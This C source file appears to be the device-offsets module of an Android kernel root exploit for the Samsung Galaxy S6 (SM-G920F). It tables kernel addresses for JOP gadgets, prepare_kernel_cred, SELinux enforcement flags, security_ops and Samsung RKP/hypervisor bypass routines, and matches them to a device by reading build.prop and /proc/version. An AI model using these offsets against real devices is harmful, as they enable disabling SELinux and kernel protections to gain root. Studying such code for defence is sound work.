#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>

#include "offsets.h"

#define ARRAYELEMS(a) (sizeof(a) / sizeof(a[0]))

struct offsets offsets[] = {
    /********************* SAMSUNG **********************/
    // Galaxy S6, 5.1.1, LMY47X.G920FXXU3COJ1
    { "SM-G920F", "Linux version 3.10.61-5917605 (dpi@SWDD6821) (gcc version 4.9 20140514 (prerelease) (GCC) ) #1 SMP PREEMPT Thu Oct 1 14:53:17 KST 2015",
        /* check_flags = */         SAMSUNG_KERNEL_OFFSET(0x01590ab8),
        /* joploc = */              SAMSUNG_KERNEL_OFFSET(0x001ddb3c),
        /* jopret = */              SAMSUNG_KERNEL_OFFSET(0x000f0d98),
        /* sidtab = */              SAMSUNG_KERNEL_OFFSET(0x014e86d0),
        /* policydb = */            SAMSUNG_KERNEL_OFFSET(0x014e84d0),
        /* selinux_enabled = */     SAMSUNG_KERNEL_OFFSET(0x010e4098),
        /* selinux_enforcing = */   SAMSUNG_KERNEL_OFFSET(0x0157f02c),
        /* rkp_override_creds = */  SAMSUNG_KERNEL_OFFSET(0x00043558),
        /* prepare_kernel_cred = */ SAMSUNG_KERNEL_OFFSET(0x00043DF0),
        /* security_ops_prctl = */  SAMSUNG_KERNEL_OFFSET(0x010e44a0),
        /* cap_task_prctl = */      SAMSUNG_KERNEL_OFFSET(0x001fb9c0),
        /* rkp_call = */            SAMSUNG_KERNEL_OFFSET(0x0000f530),
        /* exynos_smc64 = */        SAMSUNG_KERNEL_OFFSET(0x002f5a7c),
        /* vmm_disable = */         SAMSUNG_KERNEL_OFFSET(0x00001aa0),
        /* security_ops = */        SAMSUNG_KERNEL_OFFSET(0x010e4190),
        /* security_ret_0 = */      SAMSUNG_KERNEL_OFFSET(0x001fd87c),
        /* security_void = */       SAMSUNG_KERNEL_OFFSET(0x001fd880),
        /* lkmauth_bootmode = */    SAMSUNG_KERNEL_OFFSET(0x0153c450),
    },
};

#define DEVNAME_LEN 64
#define KERNELVER_LEN 256

static char* get_devname(char* name)
{
    FILE* f;
    char* line;
    static const char* devstr = "ro.product.model=";
    size_t bufsize = 1024;

    if(!name)
        return NULL;

    if(!(f = fopen("/system/build.prop", "r")))
    {
        perror("fopen()");
        return NULL;
    }

    line = malloc(bufsize);
    while(getline(&line, &bufsize, f) > 0)
    {
        if(strncmp(line, devstr, strlen(devstr)) == 0)
        {
            strncpy(name, strchr(line, '=') + 1, DEVNAME_LEN - 1);
            if(name[strlen(name) - 1] == '\n')
                name[strlen(name) - 1] = 0;
            goto end;
        }
    }
    name = NULL;

end:
    free(line);
    fclose(f);
    return name;
}

static char* get_kernelver(char* str)
{
    FILE* f;

    if(!str)
        return NULL;

    if(!(f = fopen("/proc/version", "r")))
    {
        perror("fopen()");
        return NULL;
    }

    if(fread(str, 1, KERNELVER_LEN - 1, f) > 0)
    {
        if(str[strlen(str) - 1] == '\n')
            str[strlen(str) - 1] = 0;
        goto end;
    }

    str = NULL;
end:
    fclose(f);
    return str;
}

struct offsets* get_offsets()
{
    char* devname = calloc(1, DEVNAME_LEN);
    char* kernelver = calloc(1, KERNELVER_LEN);
    unsigned int i;
    struct offsets* o = NULL;

    if(!get_devname(devname))
        goto end;
    if(!get_kernelver(kernelver))
        goto end;

    printf("Device Name: %s\n", devname);
    printf("Kernel Version: %s\n", kernelver);

    for(i = 0; i < ARRAYELEMS(offsets); i++)
    {
        if(strcmp(devname, offsets[i].devname))
            continue;
        if(strcmp(kernelver, offsets[i].kernelver))
            continue;
        o = &offsets[i];
        break;
    }

end:
    if(o == NULL)
        printf("Error: Device not supported\n");
    free(devname);
    free(kernelver);
    return o;
}
